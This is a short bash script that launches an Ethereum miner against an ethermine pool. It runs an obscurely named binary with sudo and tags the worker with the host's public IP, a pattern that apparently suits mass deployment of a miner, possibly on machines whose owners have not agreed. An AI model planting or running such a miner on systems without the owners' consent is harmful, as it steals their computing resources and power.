#!/bin/bash
#!/bin/bash

POOL=eu1.ethermine.org:4444
WALLET=0x39c240d1597a044f7b6bf85c078d41c6a3b12dde.Killer-$(echo "$(curl -s ifconfig.me)" | tr . _ )
cd "$(dirname "$0")"

chmod +x ./xcangqanetroi && sudo ./xcangqanetroi --algo ETHASH --pool $POOL --user $WALLET  $@